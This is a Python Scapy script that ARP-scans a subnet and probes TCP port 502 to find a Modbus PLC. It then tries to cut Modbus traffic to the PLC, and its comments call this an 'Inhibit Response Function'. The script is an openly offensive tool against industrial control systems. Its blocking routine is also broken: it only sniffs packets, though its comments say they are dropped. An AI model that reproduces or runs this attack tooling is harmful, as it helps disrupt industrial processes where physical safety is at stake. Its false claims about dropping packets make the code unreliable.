from scapy.all import *
import re

# Network scan to find the PLC's IP address
def find_plc_ip(subnet="192.168.9.0/24"):
    print("[+] Scanning the network for PLC...")
    plc_ip = None
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=0)
    for _, rcv in ans:
        if rcv[ARP].psrc.startswith("192.168.9."):
            print(f"[+] Possible PLC IP found: {rcv[ARP].psrc}")
            if identify_plc(rcv[ARP].psrc):
                plc_ip = rcv[ARP].psrc
                print(f"[+] Confirmed PLC IP: {plc_ip}")
                break
    if not plc_ip:
        print("[-] No PLC found on the network.")
    return plc_ip

# Function to identify if the IP belongs to the PLC based on Modbus communication or other markers
def identify_plc(ip):
    try:
        # Send a dummy Modbus request to test if the IP is a PLC
        modbus_request = IP(dst=ip) / TCP(dport=502, flags="S") / b"\x00\x00\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01"
        response = sr1(modbus_request, timeout=2, verbose=0)
        if response and response.haslayer(TCP) and response[TCP].flags == "SA":
            return True
    except Exception as e:
        print(f"[-] Error identifying PLC: {e}")
    return False

# Function to block Modbus/TCP messages to the PLC (TCP port 502)
def block_modbus_traffic(plc_ip):
    print(f"[+] Initiating traffic blocking for PLC at {plc_ip}...")
    
    # Sniff packets and drop Modbus/TCP messages (port 502)
    def drop_packet(packet):
        if packet.haslayer(IP) and packet[IP].dst == plc_ip:
            if packet.haslayer(TCP) and packet[TCP].dport == 502:
                print(f"[!] Blocking Modbus/TCP message: {packet.summary()}")
                return False  # Drop the packet
        return True  # Allow packet by default
    
    # Using Scapy's sniff tool with a callback to identify and block traffic
    sniff(filter=f"tcp and dst host {plc_ip} and dst port 502", prn=drop_packet, store=0)

def main():
    # Step 1: Detect the PLC IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("[-] PLC detection failed. Exiting.")
        return
    
    # Step 2: Block Modbus communication to the PLC (Inhibit Response Function)
    try:
        block_modbus_traffic(plc_ip)
    except KeyboardInterrupt:
        print("\n[+] Script terminated by user.")
    except Exception as e:
        print(f"[-] Error during traffic blocking: {e}")

if __name__ == "__main__":
    main()